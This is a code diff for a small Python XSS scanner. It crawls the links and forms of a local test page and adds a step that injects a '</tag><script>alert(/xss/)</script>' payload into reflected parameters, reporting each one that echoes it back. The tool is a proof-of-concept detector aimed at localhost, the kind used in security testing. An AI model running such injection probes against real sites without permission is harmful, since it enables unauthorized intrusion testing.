@@ -7,7 +7,7 @@ import re
 import os
 import sys
 
-url = 'http://127.0.0.1/xss-example/';
+url = 'http://127.0.0.1:8000/xss-example/';
 
 def get_dynamic_links_url(murl):
     '''
@@ -103,7 +103,7 @@ def get_output_position(links):
                 else:
                     response = requests.post(murl,data={p:rnd})
                 regex_rnd = r'.*{0}.*'.format(rnd)
-                regex_tags = r'\<.*\>.*?{0}.*?\<\/*\>'.format(rnd)
+                regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(rnd)
                 regex_attrs = r'\<.*\=\"{0}\".*\>'.format(rnd)
                 regex_js = r'var\s.*?\=.*?\"{0}\";'.format(rnd)
                 position = re.findall(regex_rnd,response.text)
@@ -130,10 +130,6 @@ def get_output_position(links):
                         plinks[murl][method]['page'].append(p)
     return plinks
 
-'''
-(?<=\<.*)(.*)?(?=\>STRING)
-
-'''
 
 def inject_xss_payload(links):
     '''
@@ -144,15 +140,20 @@ def inject_xss_payload(links):
             for pos,params in item.items():
                 for p in params:
                     rnd = ''.join(random.sample(string.ascii_letters,8))
-                    regex_tagname = r'(?<=\<.*)(.*)?(?=\>{0})'.format(rnd)
+                    regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(rnd)
                     if pos == 'tags':
                         if method == 'get':
-                            response = requests.get(url,params={p:rnd})
+                            response = requests.get(murl,params={p:rnd})
                         else:
-                            response = requests.post(url,data={p:rnd})
+                            response = requests.post(murl,data={p:rnd})
                         tagname = re.findall(regex_tagname,response.text)[0]
-                        payload = gen_tags_payload(tagname)
-                        print(payload)
+                        payload = '</{0}><script>alert(/xss/)</script>'.format(tagname)
+                        if method == 'get':
+                            response = requests.get(murl, params={p:payload})
+                        else:
+                            response = requests.post(murl,data={p:payload})
+                        if response.text.find(payload) != -1:
+                            print(p,'detect xss:',payload)
                     elif pos == 'attrs':
                         rnd = ''.join(random.sample(string.ascii_letters,8))
                     elif pos == 'js':
@@ -160,15 +161,6 @@ def inject_xss_payload(links):
                     else:
                         rnd = ''.join(random.sample(string.ascii_letters,8))
 
-def gen_tags_payload(tagname):
-    payload = '</{0}>alert(0)'.format(tagname)
-    return payload
-
-def gen_attrs_payload(tagname):
-    pass
-
-def gen_js_payload():
-    pass
 
 ulinks = get_dynamic_links_url(url)
 flinks = get_dynamic_links_form(url)
